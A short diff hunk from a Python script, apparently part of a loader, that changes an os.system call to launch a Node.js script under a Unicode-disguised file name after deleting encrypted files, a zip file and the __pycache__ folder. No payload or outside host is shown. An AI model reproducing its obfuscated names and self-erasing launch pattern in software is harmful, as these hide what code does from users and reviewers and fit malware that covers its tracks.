@@ -165,7 +165,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__")
-            os.system('node --no-warnings ᴘꜱᴇᴜᴅᴏ🕯️ꜱʏɴᴄ.js')
+            os.system('node --no-warnings 𝖈𝖆𝖗𝖆𝖒𝖊𝖑🕯️ꜱʏɴᴄ.js')
         else:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
